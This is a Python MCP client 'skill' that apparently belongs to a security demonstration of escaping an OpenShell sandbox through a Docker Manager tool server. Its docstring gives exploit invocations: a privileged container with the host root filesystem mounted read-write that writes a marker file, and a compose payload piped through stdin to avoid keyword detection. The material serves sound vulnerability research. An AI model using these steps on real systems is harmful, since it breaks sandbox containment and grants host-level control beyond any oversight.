#!/usr/bin/env python3
"""
docker-manage skill — MCP client wrapper (runs INSIDE the OpenShell sandbox).

Forwards tool calls over MCP to the Docker Manager MCP server running OUTSIDE
the sandbox. Because the server passes caller-supplied privilege flags and
volume mounts directly to the Docker daemon, this skill is also the privilege
escalation entry point (see VULN-01 / VULN-02 in docker_manager_mcp_server.py).

Usage:
    # List containers (benign)
    python3 manage.py --tool list_containers

    # Negative control — keyword detection rejects the dangerous compose file
    python3 manage.py --tool run_named_compose --name dev-environment

    # Path C exploit — no file write, inline privileged flag
    python3 manage.py --tool run_container \\
      --image alpine \\
      --command "touch /host/tmp/DOCKER_PRIVESC_MARKER_demo" \\
      --privileged \\
      --volumes '{"/" : {"bind": "/host", "mode": "rw"}}'

    # Path D exploit — compose YAML piped via stdin, no file on disk
    python3 manage.py --tool apply_compose --yaml-file /path/to/payload.yml

Environment:
    DOCKER_MANAGER_MCP_URL   URL of the Docker Manager MCP server
                             (default: http://host.openshell.internal:8998/mcp)
"""

import argparse
import asyncio
import json
import os
import sys

from fastmcp import Client

DEFAULT_URL = os.environ.get(
    "DOCKER_MANAGER_MCP_URL", "http://host.openshell.internal:8998/mcp"
)

VALID_TOOLS = {"list_containers", "run_named_compose", "run_container", "apply_compose"}


async def call(url: str, tool: str, kwargs: dict):
    async with Client(url) as client:
        result = await client.call_tool(tool, kwargs)
        return result


def main():
    parser = argparse.ArgumentParser(description="docker-manage MCP client skill")
    parser.add_argument("--tool", required=True, choices=sorted(VALID_TOOLS))
    parser.add_argument("--url", default=DEFAULT_URL)
    # run_named_compose
    parser.add_argument("--name", help="Compose file name (run_named_compose)")
    # run_container
    parser.add_argument("--image", help="Docker image (run_container)")
    parser.add_argument("--command", help="Container command (run_container)")
    parser.add_argument("--privileged", action="store_true",
                        help="Run privileged container (run_container)")
    parser.add_argument("--volumes", default="{}",
                        help='JSON volumes dict (run_container), e.g. \'{"/":{...}}\'')
    # apply_compose
    parser.add_argument("--yaml", dest="yaml_str",
                        help="Compose YAML as a string (apply_compose)")
    parser.add_argument("--yaml-file", dest="yaml_file",
                        help="Path to a compose YAML file to read (apply_compose)")
    args = parser.parse_args()

    print(f"[docker-manage] server={args.url} tool={args.tool}", file=sys.stderr)

    kwargs: dict = {}
    if args.tool == "list_containers":
        kwargs = {}
    elif args.tool == "run_named_compose":
        if not args.name:
            print("[docker-manage] error: --name required for run_named_compose",
                  file=sys.stderr)
            sys.exit(1)
        kwargs = {"name": args.name}
    elif args.tool == "run_container":
        if not args.image or not args.command:
            print("[docker-manage] error: --image and --command required for run_container",
                  file=sys.stderr)
            sys.exit(1)
        kwargs = {
            "image": args.image,
            "command": args.command,
            "privileged": args.privileged,
            "volumes": json.loads(args.volumes),
        }
    elif args.tool == "apply_compose":
        yaml_str = args.yaml_str
        if args.yaml_file:
            with open(args.yaml_file) as f:
                yaml_str = f.read()
        if not yaml_str:
            print("[docker-manage] error: --yaml or --yaml-file required for apply_compose",
                  file=sys.stderr)
            sys.exit(1)
        kwargs = {"yaml_str": yaml_str}

    try:
        result = asyncio.run(call(args.url, args.tool, kwargs))
    except Exception as exc:
        print(f"[docker-manage] error: {exc}", file=sys.stderr)
        sys.exit(1)

    try:
        for block in result.content:
            text = getattr(block, "text", None)
            if text is not None:
                print(text)
    except Exception:
        print(result)


if __name__ == "__main__":
    main()
